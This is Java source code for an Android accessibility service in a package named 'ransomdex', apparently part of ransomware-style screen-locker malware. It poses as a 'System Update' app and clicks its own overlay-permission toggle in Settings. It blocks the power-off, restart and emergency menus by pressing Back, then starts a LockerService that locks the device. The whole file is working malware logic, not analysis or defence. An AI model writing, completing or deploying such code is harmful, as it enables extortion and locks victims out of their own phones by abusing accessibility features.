package com.bondex.ransomdex;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;

public class CustomAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;
    private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("Service Connected - Skipping system dialogs, jumping directly to Overlay Settings"); //
        
        // Langsung lompat tanpa menunggu event pertama
        jumpToOverlaySettings(); //
    }

    private void writeLog(String text) {
        try {
            File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File myDir = new File(downloadDir, "dexlogs");
            if (!myDir.exists()) myDir.mkdirs();
            
            File logFile = new File(myDir, "logs.txt");
            FileWriter writer = new FileWriter(logFile, true);
            String timestamp = java.text.DateFormat.getDateTimeInstance().format(new java.util.Date());
            writer.append(timestamp).append(" : ").append(text).append("\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            android.util.Log.e("DEX_LOG", "Failed to write log: " + e.getMessage());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        // Jika rootNode null, langsung keluar tanpa masuk ke blok try-finally
        if (rootNode == null) return; 

        try {
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            
            // 1. Blokir Menu Power / System UI
            if (packageName.equals("android") || packageName.contains("systemui")) {
                checkAndDismissSensitiveUI(rootNode);
            }

            // 2. Alur Izin Overlay
            if (!Settings.canDrawOverlays(this)) {
                handleOverlayPermissionFlow(rootNode, packageName);
            } else {
                // Jika sudah punya izin, pastikan LockerService aktif
                triggerLocker();
            }

        } finally {
            // Objek dipastikan tidak null di sini karena sudah dicek di atas
            rootNode.recycle(); 
        }
    }
    
    private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
        long now = System.currentTimeMillis();
        if (now - lastActionTime < ACTION_DELAY) return;

        // Pastikan kita HANYA beraksi jika di dalam paket Settings
        if (!pkg.contains("settings")) return; //

        // 1. CEK: Apakah kita sudah di halaman DETAIL aplikasi?
        // Gunakan findAccessibilityNodeInfosByText("System Update") agar tidak salah klik di menu lain
        List<AccessibilityNodeInfo> labels = root.findAccessibilityNodeInfosByText("System Update"); //
        AccessibilityNodeInfo switchNode = findNodeById(root, "android:id/switch_widget"); //

        if (!labels.isEmpty() && switchNode != null) {
            if (!switchNode.isChecked()) {
                writeLog("Confirmed Detail Page. Clicking Toggle ON."); //
                performClick(switchNode);
            } else {
                writeLog("Toggle already ON. Launching Locker Service."); //
                triggerLocker(); // Langsung eksekusi tanpa menunggu user kembali
            }
            switchNode.recycle();
            return;
        }

        // 2. CEK: Jika masih di DAFTAR (List) aplikasi Settings
        // Cari teks yang benar-benar spesifik "System Update"
        clickByText(root, "System Update"); //
    }

    private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    private void clickByText(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> targets = node.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo target : targets) {
            if (target.getText() != null && target.getText().toString().equalsIgnoreCase(text)) {
                performClick(target);
            }
            target.recycle();
        }
    }

    private void performClick(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo clickable = node;
        while (clickable != null && !clickable.isClickable()) {
            clickable = clickable.getParent();
        }
        if (clickable != null && clickable.isClickable()) {
            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            lastActionTime = System.currentTimeMillis();
        }
    }

    private void checkAndDismissSensitiveUI(AccessibilityNodeInfo node) {
        String[] powerKeywords = {"Power off", "Restart", "Daya mati", "Mulai lagi", "Darurat"};
        for (String key : powerKeywords) {
            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            }
        }
    }

    private void jumpToOverlaySettings() {
        writeLog("Executing Jump to Overlay Settings");
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                                Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    }

    private void triggerLocker() {
        if (!LockerService.isAuthenticated) {
            Intent intent = new Intent(this, LockerService.class);
            startService(intent);
        }
    }

    @Override
    public void onInterrupt() {}
}